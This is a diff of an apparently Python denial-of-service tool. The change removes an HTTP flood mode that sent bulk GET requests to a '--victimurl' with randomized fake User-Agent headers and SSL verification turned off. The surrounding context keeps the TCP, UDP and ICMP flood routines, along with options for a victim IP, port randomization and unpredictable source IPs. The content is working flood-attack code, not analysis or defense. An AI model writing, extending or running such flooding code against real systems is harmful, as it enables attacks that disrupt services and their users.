@@ -44,7 +44,7 @@ def print_banner():
 ''')
 
 tsize = 0 #total bytes sent
-types = ["tcp", "udp", "icmp", "http"] # types of attack (not sure if http flood works)
+types = ["tcp", "udp", "icmp"] # types of attack (not sure if http flood works)
 athreads = [] # contains all current threads
 
 #-- defaults --#
@@ -55,8 +55,6 @@ typea="tcp" # the type of attack
 dest_ip="127.0.0.1"
 lock_port=True
 port=3703
-dest_url = "about:blank"
-n_req = 1000
 up_ip = False #unpredictable source ip
 
 #validate ip
@@ -89,10 +87,6 @@ if len(sys.argv) > 1:
         if arg.startswith("--victimip"):
             dest_ip = arg.removeprefix("--victimip")
             validate_ip(dest_ip)
-        # the victims url for http flood
-        if arg.startswith("--victimurl"):
-            dest_url = arg.removeprefix("--victimurl")
-            validate_url(dest_url)
         # unlock port randomization
         if arg == "--unlockport":
             lock_port = False
@@ -100,9 +94,6 @@ if len(sys.argv) > 1:
         if arg.startswith("--setport"):
             port = int(arg.removeprefix("--setport"))
             if not port>10000: exit(f"Port {port} is invalid!")
-        # set number of requests for http flood
-        if arg.startswith("--rqn"):
-            n_req == int(arg.removeprefix("--rqn"))
         # make ip unpredictable (uses secrets.randbelow() instead of random.randint())
         if arg == "--upip":
             up_ip = True
@@ -160,35 +151,6 @@ def udp_flood(thread):
         if doprint: print(f"[UDP] PAYLOAD OF {payload_size}B TO {dest_ip} THREAD {thread}")
         sleep(0)
 
-#send request, used for http flood
-async def send_req(session, thread):
-    global tsize
-    try:
-        # fake headers to make the request more legit
-        headers = {
-            "User-Agent": UserAgent().random,
-            "Connection": "keep-alive",
-            "Accept": "*/*"
-        }
-        #disable ssl verif
-        async with session.get(dest_url, headers = headers, ssl = False ) as response:
-            tsize +=1
-            print(f"[HTTP] GET REQUEST SENT TO {dest_url} STATUS: {response.status} THREAD {thread}")
-    except TimeoutError:
-        print("[HTTP] timed out")
-    except ClientError as e:
-        print(f"[HTTP] client exception: {e}")
-    except Exception as e: print(f"[HTTP] exception: {e}")
-
-#http flood attack (very buggy)
-async def http_flood(thread):
-    connection = TCPConnector()
-    timeout = ClientTimeout(total=10)
-    async with ClientSession(connector = connection, timeout = timeout) as session:
-        tasks = [send_req(session, thread) for _ in range(n_req)]
-        responses = await(asyncio.gather(*tasks))
-        (response for response in responses)
-
 
 #-- helpers --#
 def stopv():
@@ -204,7 +166,6 @@ def attack(thread):
         case "tcp": tcp_flood(thread)
         case "udp": udp_flood(thread)
         case "icmp": icmp_flood(thread)
-        case "http": asyncio.run(http_flood(thread))
 
 #-- MAIN --#
 def main():
